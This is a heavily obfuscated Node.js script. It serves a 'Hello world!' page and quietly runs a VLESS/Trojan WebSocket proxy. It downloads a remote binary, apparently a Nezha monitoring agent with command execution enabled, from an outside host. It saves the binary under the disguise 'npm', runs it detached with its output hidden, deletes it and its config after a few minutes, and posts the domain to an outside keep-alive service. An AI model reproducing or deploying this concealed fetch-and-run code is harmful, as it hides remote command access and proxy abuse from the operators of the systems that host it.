function _0x504d(){const _0x29a50e=['ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Hug','unlink',':443?security=tls&sni=','npm','type','path','https://','\x20with\x20all\x20DNS\x20servers','https://arm64.ssss.nyc.mn/agent','createWriteStream','utf8','client_secret:\x20','http','catch','includes','net','end','data','WSPATH','base64','utf-8','env','pipe','21gldeOo','Server\x20is\x20running\x20on\x20port\x20','length','connection','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','url','https://amd64.ssss.nyc.mn/v1','&type=A','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','/bin/bash','105FQKGQQ','readUInt16BE','https://arm64.ssss.nyc.mn/v1','then','split','false','12222nWMVmY','send','crypto','npm\x20is\x20already\x20running,\x20skip\x20running...','true','replace','8443','SUB_PATH','concat','finish','asOrganization','https://dns.google/resolve?name=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','config.yaml','update','readUInt8','443','application/dns-json','every','2083','text/html','log','writeFileSync','createHash','1234.abc.com','AUTO_ACCESS','https://oooo.serv00.net/add-url','6358176qBJXVw','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country','Unknown','test','arm','index.html','9624wUPdTb','arm64','UUID','&fp=chrome&type=ws&host=','Status','slice','Answer','map','trim','npm\x20is\x20running','setsid\x20nohup\x20./npm\x20-s\x20','buffer','--tls','NEZHA_KEY','Automatic\x20Access\x20Task\x20added\x20successfully','write','digest','hex','message',':443?encryption=none&security=tls&sni=','864488SNCZJk','error','listen','NEZHA_PORT','13279950kiGEHl','https://amd64.ssss.nyc.mn/agent','text/plain','substr','366TxiIPf','join','PORT','close','518668UwFqcc','chmod\x20+x\x20npm','child_process','&path=%2F','connect','606996YQoFml','reduce','Hello\x20world!','get','stream','Failed\x20to\x20resolve\x20','axios','toString','decode','8.8.4.4','vless://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','dd3a9ae1-edc0-06a4-9e04-2e885b571e7c','writeHead','createServer'];_0x504d=function(){return _0x29a50e;};return _0x504d();}const _0x1cf9a0=_0x3a6c;function _0x3a6c(_0x54cbe5,_0x574819){const _0x504d05=_0x504d();return _0x3a6c=function(_0x3a6ccd,_0x1cfa75){_0x3a6ccd=_0x3a6ccd-0x175;let _0x545367=_0x504d05[_0x3a6ccd];return _0x545367;},_0x3a6c(_0x54cbe5,_0x574819);}(function(_0x5d1c54,_0x78ac7d){const _0x412398=_0x3a6c,_0x9ea56c=_0x5d1c54();while(!![]){try{const _0x18c12c=-parseInt(_0x412398(0x188))/0x1+-parseInt(_0x412398(0x18d))/0x2+-parseInt(_0x412398(0x184))/0x3*(-parseInt(_0x412398(0x1e6))/0x4)+parseInt(_0x412398(0x1be))/0x5*(-parseInt(_0x412398(0x1c4))/0x6)+parseInt(_0x412398(0x1b4))/0x7*(parseInt(_0x412398(0x17c))/0x8)+-parseInt(_0x412398(0x1df))/0x9+parseInt(_0x412398(0x180))/0xa;if(_0x18c12c===_0x78ac7d)break;else _0x9ea56c['push'](_0x9ea56c['shift']());}catch(_0x1cb48c){_0x9ea56c['push'](_0x9ea56c['shift']());}}}(_0x504d,0x5b61f));const os=require('os'),http=require(_0x1cf9a0(0x1a9)),fs=require('fs'),axios=require(_0x1cf9a0(0x193)),net=require(_0x1cf9a0(0x1ac)),path=require(_0x1cf9a0(0x1a2)),crypto=require(_0x1cf9a0(0x1c6)),{Buffer}=require(_0x1cf9a0(0x1f1)),{exec,execSync}=require(_0x1cf9a0(0x18a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x1e8)]||_0x1cf9a0(0x199),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x17f)]||'',NEZHA_KEY=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x175)]||'',DOMAIN=process['env']['DOMAIN']||_0x1cf9a0(0x1dc),AUTO_ACCESS=process['env'][_0x1cf9a0(0x1dd)]||!![],WSPATH=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x1af)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x1cb)]||'sub',NAME=process[_0x1cf9a0(0x1b2)]['NAME']||_0x1cf9a0(0x19d),PORT=process[_0x1cf9a0(0x1b2)][_0x1cf9a0(0x186)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5438ab=_0x1cf9a0;try{const _0x1ac003=await axios[_0x5438ab(0x190)]('https://speed.cloudflare.com/meta'),_0x2273bc=_0x1ac003[_0x5438ab(0x1ae)];ISP=(_0x2273bc[_0x5438ab(0x1e1)]+'-'+_0x2273bc[_0x5438ab(0x1ce)])[_0x5438ab(0x1c9)](/ /g,'_');}catch(_0x2fd7bf){ISP=_0x5438ab(0x1e2);}};GetISP();const httpServer=http[_0x1cf9a0(0x19b)]((_0x17226a,_0x531a05)=>{const _0x5059c8=_0x1cf9a0;if(_0x17226a[_0x5059c8(0x1b9)]==='/'){const _0x5e0432=path[_0x5059c8(0x185)](__dirname,_0x5059c8(0x1e5));fs['readFile'](_0x5e0432,_0x5059c8(0x1a7),(_0x2d9072,_0x585db6)=>{const _0x480fc9=_0x5059c8;if(_0x2d9072){_0x531a05[_0x480fc9(0x19a)](0xc8,{'Content-Type':_0x480fc9(0x1d8)}),_0x531a05[_0x480fc9(0x1ad)](_0x480fc9(0x18f));return;}_0x531a05[_0x480fc9(0x19a)](0xc8,{'Content-Type':_0x480fc9(0x1d8)}),_0x531a05['end'](_0x585db6);});return;}else{if(_0x17226a['url']==='/'+SUB_PATH){const _0x5412ab=_0x5059c8(0x197)+UUID+'@'+DOMAIN+_0x5059c8(0x17b)+DOMAIN+_0x5059c8(0x1e9)+DOMAIN+_0x5059c8(0x18b)+WSPATH+'#'+NAME+'-'+ISP,_0x2adceb='trojan://'+UUID+'@'+DOMAIN+_0x5059c8(0x19f)+DOMAIN+_0x5059c8(0x1e9)+DOMAIN+_0x5059c8(0x18b)+WSPATH+'#'+NAME+'-'+ISP,_0x352342=_0x5412ab+'\x0a'+_0x2adceb,_0x436a1b=Buffer['from'](_0x352342)[_0x5059c8(0x194)](_0x5059c8(0x1b0));_0x531a05[_0x5059c8(0x19a)](0xc8,{'Content-Type':_0x5059c8(0x182)}),_0x531a05['end'](_0x436a1b+'\x0a');}else _0x531a05[_0x5059c8(0x19a)](0x194,{'Content-Type':'text/plain'}),_0x531a05[_0x5059c8(0x1ad)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x1cf9a0(0x196),'1.1.1.1'];function resolveHost(_0x4c8e69){return new Promise((_0x3fd805,_0x4429b3)=>{const _0x179579=_0x3a6c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x179579(0x1e3)](_0x4c8e69)){_0x3fd805(_0x4c8e69);return;}let _0x4fa10c=0x0;function _0x5c2615(){const _0x5d6345=_0x179579;if(_0x4fa10c>=DNS_SERVERS[_0x5d6345(0x1b6)]){_0x4429b3(new Error(_0x5d6345(0x192)+_0x4c8e69+_0x5d6345(0x1a4)));return;}const _0x31e3ed=DNS_SERVERS[_0x4fa10c];_0x4fa10c++;const _0x4f0773=_0x5d6345(0x1cf)+encodeURIComponent(_0x4c8e69)+_0x5d6345(0x1bb);axios[_0x5d6345(0x190)](_0x4f0773,{'timeout':0x1388,'headers':{'Accept':_0x5d6345(0x1d5)}})[_0x5d6345(0x1c1)](_0x37b286=>{const _0x2ebbdb=_0x5d6345,_0x35176e=_0x37b286[_0x2ebbdb(0x1ae)];if(_0x35176e[_0x2ebbdb(0x1ea)]===0x0&&_0x35176e[_0x2ebbdb(0x1ec)]&&_0x35176e['Answer']['length']>0x0){const _0x50e502=_0x35176e[_0x2ebbdb(0x1ec)]['find'](_0x47ae20=>_0x47ae20[_0x2ebbdb(0x1a1)]===0x1);if(_0x50e502){_0x3fd805(_0x50e502['data']);return;}}_0x5c2615();})[_0x5d6345(0x1aa)](_0x5969cd=>{_0x5c2615();});}_0x5c2615();});}function handleVlessConnection(_0x59bc8d,_0x1aeefe){const _0x7384b6=_0x1cf9a0,[_0x288939]=_0x1aeefe,_0x5817b8=_0x1aeefe[_0x7384b6(0x1eb)](0x1,0x11);if(!_0x5817b8[_0x7384b6(0x1d6)]((_0x4be103,_0x35ec2d)=>_0x4be103==parseInt(uuid[_0x7384b6(0x183)](_0x35ec2d*0x2,0x2),0x10)))return![];let _0x1bbea2=_0x1aeefe[_0x7384b6(0x1eb)](0x11,0x12)[_0x7384b6(0x1d3)]()+0x13;const _0x107f85=_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2,_0x1bbea2+=0x2)[_0x7384b6(0x1bf)](0x0),_0xfd71e6=_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2,_0x1bbea2+=0x1)[_0x7384b6(0x1d3)](),_0x28d3ee=_0xfd71e6==0x1?_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2,_0x1bbea2+=0x4)[_0x7384b6(0x185)]('.'):_0xfd71e6==0x2?new TextDecoder()[_0x7384b6(0x195)](_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2+0x1,_0x1bbea2+=0x1+_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2,_0x1bbea2+0x1)[_0x7384b6(0x1d3)]())):_0xfd71e6==0x3?_0x1aeefe[_0x7384b6(0x1eb)](_0x1bbea2,_0x1bbea2+=0x10)[_0x7384b6(0x18e)]((_0x1a9ee7,_0xf6572a,_0x79aac3,_0x336213)=>_0x79aac3%0x2?_0x1a9ee7['concat'](_0x336213[_0x7384b6(0x1eb)](_0x79aac3-0x1,_0x79aac3+0x1)):_0x1a9ee7,[])['map'](_0x210a6d=>_0x210a6d[_0x7384b6(0x1bf)](0x0)[_0x7384b6(0x194)](0x10))[_0x7384b6(0x185)](':'):'';_0x59bc8d[_0x7384b6(0x1c5)](new Uint8Array([_0x288939,0x0]));const _0x12632e=createWebSocketStream(_0x59bc8d);return resolveHost(_0x28d3ee)['then'](_0x1111d9=>{const _0x3e6afd=_0x7384b6;net[_0x3e6afd(0x18c)]({'host':_0x1111d9,'port':_0x107f85},function(){const _0x218366=_0x3e6afd;this[_0x218366(0x177)](_0x1aeefe[_0x218366(0x1eb)](_0x1bbea2)),_0x12632e['on']('error',()=>{})['pipe'](this)['on'](_0x218366(0x17d),()=>{})[_0x218366(0x1b3)](_0x12632e);})['on'](_0x3e6afd(0x17d),()=>{});})[_0x7384b6(0x1aa)](_0x30c6fe=>{const _0x2a79c4=_0x7384b6;net['connect']({'host':_0x28d3ee,'port':_0x107f85},function(){const _0x16e627=_0x3a6c;this[_0x16e627(0x177)](_0x1aeefe[_0x16e627(0x1eb)](_0x1bbea2)),_0x12632e['on']('error',()=>{})[_0x16e627(0x1b3)](this)['on'](_0x16e627(0x17d),()=>{})[_0x16e627(0x1b3)](_0x12632e);})['on'](_0x2a79c4(0x17d),()=>{});}),!![];}function handleTrojanConnection(_0x165157,_0x256b1c){const _0x4af11f=_0x1cf9a0;try{if(_0x256b1c['length']<0x3a)return![];const _0x37626d=_0x256b1c[_0x4af11f(0x1eb)](0x0,0x38)['toString'](),_0x56b4e3=[UUID];let _0x23b652=null;for(const _0x24dacc of _0x56b4e3){const _0x4e887e=crypto[_0x4af11f(0x1db)]('sha224')[_0x4af11f(0x1d2)](_0x24dacc)[_0x4af11f(0x178)](_0x4af11f(0x179));if(_0x4e887e===_0x37626d){_0x23b652=_0x24dacc;break;}}if(!_0x23b652)return![];let _0x54e7d2=0x38;_0x256b1c[_0x54e7d2]===0xd&&_0x256b1c[_0x54e7d2+0x1]===0xa&&(_0x54e7d2+=0x2);const _0x2a0778=_0x256b1c[_0x54e7d2];if(_0x2a0778!==0x1)return![];_0x54e7d2+=0x1;const _0x36f06e=_0x256b1c[_0x54e7d2];_0x54e7d2+=0x1;let _0x2a954c,_0x4177f3;if(_0x36f06e===0x1)_0x2a954c=_0x256b1c[_0x4af11f(0x1eb)](_0x54e7d2,_0x54e7d2+0x4)[_0x4af11f(0x185)]('.'),_0x54e7d2+=0x4;else{if(_0x36f06e===0x3){const _0x356eff=_0x256b1c[_0x54e7d2];_0x54e7d2+=0x1,_0x2a954c=_0x256b1c[_0x4af11f(0x1eb)](_0x54e7d2,_0x54e7d2+_0x356eff)[_0x4af11f(0x194)](),_0x54e7d2+=_0x356eff;}else{if(_0x36f06e===0x4)_0x2a954c=_0x256b1c[_0x4af11f(0x1eb)](_0x54e7d2,_0x54e7d2+0x10)[_0x4af11f(0x18e)]((_0x1ea5d3,_0x45f956,_0x297aca,_0x25fe61)=>_0x297aca%0x2?_0x1ea5d3[_0x4af11f(0x1cc)](_0x25fe61[_0x4af11f(0x1eb)](_0x297aca-0x1,_0x297aca+0x1)):_0x1ea5d3,[])[_0x4af11f(0x1ed)](_0x298ef5=>_0x298ef5[_0x4af11f(0x1bf)](0x0)['toString'](0x10))['join'](':'),_0x54e7d2+=0x10;else return![];}}_0x4177f3=_0x256b1c[_0x4af11f(0x1bf)](_0x54e7d2),_0x54e7d2+=0x2;_0x54e7d2<_0x256b1c[_0x4af11f(0x1b6)]&&_0x256b1c[_0x54e7d2]===0xd&&_0x256b1c[_0x54e7d2+0x1]===0xa&&(_0x54e7d2+=0x2);const _0x14c41b=createWebSocketStream(_0x165157);return resolveHost(_0x2a954c)['then'](_0x37e7ab=>{const _0x187b7f=_0x4af11f;net[_0x187b7f(0x18c)]({'host':_0x37e7ab,'port':_0x4177f3},function(){const _0x1bf204=_0x187b7f;_0x54e7d2<_0x256b1c[_0x1bf204(0x1b6)]&&this[_0x1bf204(0x177)](_0x256b1c[_0x1bf204(0x1eb)](_0x54e7d2)),_0x14c41b['on'](_0x1bf204(0x17d),()=>{})[_0x1bf204(0x1b3)](this)['on'](_0x1bf204(0x17d),()=>{})['pipe'](_0x14c41b);})['on'](_0x187b7f(0x17d),()=>{});})['catch'](_0x52225f=>{const _0x9766c3=_0x4af11f;net[_0x9766c3(0x18c)]({'host':_0x2a954c,'port':_0x4177f3},function(){const _0xe31179=_0x9766c3;_0x54e7d2<_0x256b1c[_0xe31179(0x1b6)]&&this[_0xe31179(0x177)](_0x256b1c['slice'](_0x54e7d2)),_0x14c41b['on'](_0xe31179(0x17d),()=>{})[_0xe31179(0x1b3)](this)['on'](_0xe31179(0x17d),()=>{})[_0xe31179(0x1b3)](_0x14c41b);})['on'](_0x9766c3(0x17d),()=>{});}),!![];}catch(_0x454bf6){return![];}}wss['on'](_0x1cf9a0(0x1b7),(_0x53b035,_0x233944)=>{const _0x1451ad=_0x1cf9a0,_0x36e033=_0x233944['url']||'';_0x53b035['once'](_0x1451ad(0x17a),_0x5d0ada=>{const _0x29d264=_0x1451ad;if(_0x5d0ada['length']>0x11&&_0x5d0ada[0x0]===0x0){const _0x28274a=_0x5d0ada['slice'](0x1,0x11),_0xf7def=_0x28274a['every']((_0x35feb8,_0x1e3d71)=>_0x35feb8==parseInt(uuid[_0x29d264(0x183)](_0x1e3d71*0x2,0x2),0x10));if(_0xf7def){!handleVlessConnection(_0x53b035,_0x5d0ada)&&_0x53b035[_0x29d264(0x187)]();return;}}!handleTrojanConnection(_0x53b035,_0x5d0ada)&&_0x53b035[_0x29d264(0x187)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0xc6d848=_0x1cf9a0,_0x3e055c=os['arch']();return _0x3e055c===_0xc6d848(0x1e4)||_0x3e055c===_0xc6d848(0x1e7)||_0x3e055c==='aarch64'?!NEZHA_PORT?_0xc6d848(0x1c0):_0xc6d848(0x1a5):!NEZHA_PORT?_0xc6d848(0x1ba):_0xc6d848(0x181);},downloadFile=async()=>{const _0x58711e=_0x1cf9a0;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x303c9b=getDownloadUrl(),_0x569d37=await axios({'method':'get','url':_0x303c9b,'responseType':_0x58711e(0x191)}),_0x5bb462=fs[_0x58711e(0x1a6)]('npm');return _0x569d37[_0x58711e(0x1ae)]['pipe'](_0x5bb462),new Promise((_0x278d1f,_0xd7596b)=>{const _0x5abcbf=_0x58711e;_0x5bb462['on'](_0x5abcbf(0x1cd),()=>{const _0x3a4060=_0x5abcbf;console[_0x3a4060(0x1d9)]('npm\x20download\x20successfully'),exec(_0x3a4060(0x189),_0x16cd27=>{if(_0x16cd27)_0xd7596b(_0x16cd27);_0x278d1f();});}),_0x5bb462['on'](_0x5abcbf(0x17d),_0xd7596b);});}catch(_0x272d86){throw _0x272d86;}},runnz=async()=>{const _0x1bcce7=_0x1cf9a0;try{const _0x35e467=execSync(_0x1bcce7(0x19c),{'encoding':_0x1bcce7(0x1b1)});if(_0x35e467[_0x1bcce7(0x1ee)]()!==''){console[_0x1bcce7(0x1d9)](_0x1bcce7(0x1c7));return;}}catch(_0x399496){}await downloadFile();let _0x56505e='',_0x1e0b1a=[_0x1bcce7(0x1d4),_0x1bcce7(0x1ca),'2096','2087',_0x1bcce7(0x1d7),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x46b655=_0x1e0b1a[_0x1bcce7(0x1ab)](NEZHA_PORT)?_0x1bcce7(0x1f2):'';_0x56505e=_0x1bcce7(0x1f0)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x46b655+_0x1bcce7(0x198);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe2c4f4=NEZHA_SERVER[_0x1bcce7(0x1ab)](':')?NEZHA_SERVER[_0x1bcce7(0x1c2)](':')['pop']():'',_0x42e12d=_0x1e0b1a['includes'](_0xe2c4f4)?_0x1bcce7(0x1c8):_0x1bcce7(0x1c3),_0x20cb98=_0x1bcce7(0x1a8)+NEZHA_KEY+_0x1bcce7(0x1d0)+NEZHA_SERVER+_0x1bcce7(0x1e0)+_0x42e12d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1bcce7(0x1da)](_0x1bcce7(0x1d1),_0x20cb98);}_0x56505e=_0x1bcce7(0x1b8);}else{console[_0x1bcce7(0x1d9)](_0x1bcce7(0x1bc));return;}}try{exec(_0x56505e,{'shell':_0x1bcce7(0x1bd)},_0xc9b821=>{const _0x10cdc6=_0x1bcce7;if(_0xc9b821)console['error']('npm\x20running\x20error:',_0xc9b821);else console[_0x10cdc6(0x1d9)](_0x10cdc6(0x1ef));});}catch(_0x1f2d94){console[_0x1bcce7(0x17d)]('error:\x20'+_0x1f2d94);}};async function addAccessTask(){const _0xf688af=_0x1cf9a0;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x48452f=_0xf688af(0x1a3)+DOMAIN;try{const _0xba4106=await axios['post'](_0xf688af(0x1de),{'url':_0x48452f},{'headers':{'Content-Type':'application/json'}});console[_0xf688af(0x1d9)](_0xf688af(0x176));}catch(_0x3ad7dc){}}const delFiles=()=>{const _0x17d38d=_0x1cf9a0;fs[_0x17d38d(0x19e)](_0x17d38d(0x1a0),()=>{}),fs['unlink'](_0x17d38d(0x1d1),()=>{});};httpServer[_0x1cf9a0(0x17e)](PORT,()=>{const _0x1314aa=_0x1cf9a0;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1314aa(0x1d9)](_0x1314aa(0x1b5)+PORT);});
